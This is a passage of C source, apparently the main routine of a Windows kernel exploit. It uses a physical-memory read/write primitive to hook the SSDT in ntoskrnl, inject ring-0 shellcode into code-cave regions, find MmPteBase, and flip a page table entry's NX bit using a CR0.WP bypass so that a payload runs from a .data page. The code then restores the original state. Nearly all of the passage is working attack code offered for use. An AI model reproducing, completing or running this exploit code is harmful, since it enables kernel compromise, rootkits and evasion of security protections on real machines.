    uint64_t orig_fn_va=(uint64_t)((int64_t)kisvc_va+d0);
    printf("  [*] SSDT[%u]  orig_fn=0x%016"PRIX64"\n",ssdt_idx,orig_fn_va);
    if((orig_fn_va>>48)!=0xFFFF){printf("[-] orig_fn invalid\n");return 1;}

    printf("\n[*] Finding .text CC region...\n");
    uint64_t cc_va=0,cc_pa=0; uint8_t cc_saved[CC_REGION_SZ];
    if(!find_cc_region(nt_phys,nt->va_base,nt->size,
                        "C:\\Windows\\System32\\ntoskrnl.exe",
                        &cc_va,&cc_pa,cc_saved)) return 1;

    printf("\n[*] Finding .data zero region...\n");
    uint64_t dr_va=0,dr_pa=0; uint8_t dr_saved[DATA_REGION_SZ];
    if(!find_zero_region(nt_phys,nt->va_base,nt->size,
                          "C:\\Windows\\System32\\ntoskrnl.exe",
                          &dr_va,&dr_pa,dr_saved)) return 1;

    /* .data region layout:
     *   +0x00  signal1_val  (8B: CR3 or 0)  ← written by shellcode A
     *   +0x08  signal1_flag (4B = 1)        ← written by shellcode A
     *   +0x10  payload      (32B max)       ← shellcode D, written by us
     *   +0x40  signal2      (4B = 2)        ← written by shellcode D (from .data!)
     *   +0x50  signal3      (4B = 3)        ← written by shellcode C (NX restore done)
     */
    uint64_t payload_va = dr_va + 0x10;
    uint64_t signal2_va = dr_va + 0x40;
    uint64_t signal3_va = dr_va + 0x50;
    uint64_t payload_pa = dr_pa + 0x10;
    uint64_t signal2_pa = dr_pa + 0x40;
    uint64_t signal3_pa = dr_pa + 0x50;
    printf("  [*] payload VA=0x%016"PRIX64"  PA=0x%012"PRIX64"\n",payload_va,payload_pa);

    /* Declare trigger fn early so all steps can use it */
    typedef NTSTATUS (NTAPI *Zw_t)(void);
    Zw_t fn=(Zw_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwTestAlert");
    if(!fn) fn=(Zw_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwYieldExecution");

    uint32_t sig2=0, sig3=0;  /* declare here for goto-compatible scoping */

    /* ════════════════════════════════════════════════════════════════
     * STEP 1: Find MmPteBase by pattern-scanning ntoskrnl .text
     * ════════════════════════════════════════════════════════════════ */
    printf("\n══ Step 1: Find MmPteBase ══\n");
    uint64_t mmptebase = find_mmptebase(nt_phys, nt->va_base, nt->size, nt_delta);
    if (!mmptebase) { printf("[-] MmPteBase not found\n"); return 1; }

    /* Compute PTE VA for payload page */
    uint64_t payload_page_va = payload_va & ~0xFFFULL;
    uint64_t pte_va = ((payload_page_va >> 9) & ~7ULL) + mmptebase;
    printf("  [*] PTE VA for payload page = 0x%016"PRIX64"\n", pte_va);

    /* ════════════════════════════════════════════════════════════════
     * STEP 2: Write data_payload shellcode to .data via physical write
     * ════════════════════════════════════════════════════════════════ */
    printf("\n══ Step 2: Write payload shellcode to .data ══\n");
    uint8_t scD[64]={0};
    int lenD=build_data_payload(scD,sizeof scD,signal2_va,orig_fn_va);
    if(!lenD) return 1;
    if(!phys_write(payload_pa,scD,(uint32_t)lenD)){
        printf("[-] phys_write payload failed\n");return 1;}
    printf("  [+] Payload written to .data PA=0x%012"PRIX64"\n",payload_pa);

    /* ════════════════════════════════════════════════════════════════
     * STEP 2.5: Read PTE value via safe ring-0 shellcode
     *   Validates MmPteBase before attempting the dangerous write.
     *   Kernel reads of PTEs always succeed (hypervisor allows reads).
     *   If PTE value has P=1 and NX=1 → MmPteBase is correct.
     * ════════════════════════════════════════════════════════════════ */
    printf("\n══ Step 2.5: Safe PTE read (validate MmPteBase) ══\n");
    /* Reuse .data region: [+0x60]=pte_val, [+0x68]=read_signal */
    uint64_t pte_readback_va = dr_va + 0x60;
    uint64_t pte_readback_pa = dr_pa + 0x60;
    uint8_t scR[64]={0};
    int lenR = build_pte_reader(scR, sizeof scR, pte_va, pte_readback_va, orig_fn_va);
    if (lenR) {
        phys_write(cc_pa, scR, (uint32_t)lenR);
        int32_t origR=0;
        if (ssdt_patch(kisvc_va,kisvc_pa,ssdt_idx,cc_va,&origR)) {
            Sleep(10);
            printf("  [*] Triggering PTE read...\n");
            if(fn) fn();
            Sleep(5);
            ssdt_restore(kisvc_pa,ssdt_idx,origR);
            uint32_t rsig=0; uint64_t pte_readback=0;
            phys_read(pte_readback_pa+8, &rsig, 4);
            phys_read(pte_readback_pa,   &pte_readback, 8);
            printf("  [%c] PTE read signal=%u\n", rsig==1?'+':'-', rsig);
            if (rsig==1) {
                printf("  [+] PTE value = 0x%016"PRIX64"\n", pte_readback);
                printf("      P=%d  W=%d  NX=%d  large=%d\n",
                       (int)(pte_readback&1),(int)!!(pte_readback&2),
                       (int)!!(pte_readback>>63),(int)!!(pte_readback&0x80));
                if (!(pte_readback & 1)) {
                    printf("  [!] PTE not present — MmPteBase likely wrong, aborting flip\n");
                    goto cleanup;
                }
                if (!(pte_readback >> 63)) {
                    printf("  [!] NX already clear — page already executable\n");
                }
            } else {
                printf("  [-] PTE read failed — MmPteBase wrong or hypervisor blocked\n");
                goto cleanup;
            }
        }
    }

    /* ════════════════════════════════════════════════════════════════
     * STEP 3: SSDT hook → nx_flip shellcode
     * ════════════════════════════════════════════════════════════════ */
    printf("\n══ Step 3: NX flip + execute .data ══\n");
    uint8_t scB[64]={0};
    int lenB=build_nx_flip(scB,sizeof scB,pte_va,payload_page_va,payload_va);
    if(!lenB) return 1;
    if(!phys_write(cc_pa,scB,(uint32_t)lenB)){
        printf("[-] phys_write nx_flip failed\n");return 1;}

    int32_t orig2=0;
    if(!ssdt_patch(kisvc_va,kisvc_pa,ssdt_idx,cc_va,&orig2)) return 1;
    Sleep(10);

    printf("  [*] Triggering: .text→CR0.WP=0→BTR[PTE]→INVLPG→.data payload\n");
    if(fn) fn();
    Sleep(5);
    ssdt_restore(kisvc_pa,ssdt_idx,orig2);

    /* ════════════════════════════════════════════════════════════════
     * STEP 4: Check signal2
     * ════════════════════════════════════════════════════════════════ */
    printf("\n══ Step 4: Check signal ══\n");
    phys_read(signal2_pa,&sig2,4);

    if(sig2==2){
        printf("\n[+] ══════════════════════════════════════════════════════\n");
        printf("[+]  PTE FLIP CONFIRMED — EXECUTED FROM .data PAGE\n");
        printf("[+]  Technique: CR0.WP bypass + BTR [PTE_VA], 63 + INVLPG\n");
        printf("[+]  signal2=%u  payload PA=0x%012"PRIX64"\n",sig2,payload_pa);
        printf("[+] ══════════════════════════════════════════════════════\n");
    } else {
        printf("\n[-] signal2=%u — .data payload did not run\n",sig2);
        printf("    PTE VA  = 0x%016"PRIX64"\n",pte_va);
        printf("    payload = VA=0x%016"PRIX64"  PA=0x%012"PRIX64"\n",payload_va,payload_pa);
        /* Check if NX was actually flipped by reading PTE value */
        printf("    (NX flip may have succeeded even if payload didn't run)\n");
    }

    /* ════════════════════════════════════════════════════════════════
     * STEP 5: Restore NX bit via second SSDT hook
     * ════════════════════════════════════════════════════════════════ */
    printf("\n══ Step 5: Restore NX bit ══\n");
    uint8_t scC[64]={0};
    int lenC=build_nx_restore(scC,sizeof scC,pte_va,signal3_va,orig_fn_va);
    if(lenC){
        phys_write(cc_pa,scC,(uint32_t)lenC);
        int32_t orig3=0;
        if(ssdt_patch(kisvc_va,kisvc_pa,ssdt_idx,cc_va,&orig3)){
            Sleep(10);
            printf("  [*] Triggering: NX restore\n");
            if(fn) fn();
            Sleep(5);
            ssdt_restore(kisvc_pa,ssdt_idx,orig3);
            phys_read(signal3_pa,&sig3,4);
            printf("  [%c] NX restore signal=%u\n",sig3==3?'+':'-',sig3);
        }
    }

cleanup:
    printf("\n[*] Restoring .text CC and .data region...\n");
    phys_write(cc_pa, cc_saved, CC_REGION_SZ);
    phys_write(dr_pa, dr_saved, DATA_REGION_SZ);
    printf("[+] Done.\n");

    return (sig2==2) ? 0 : 1;
}
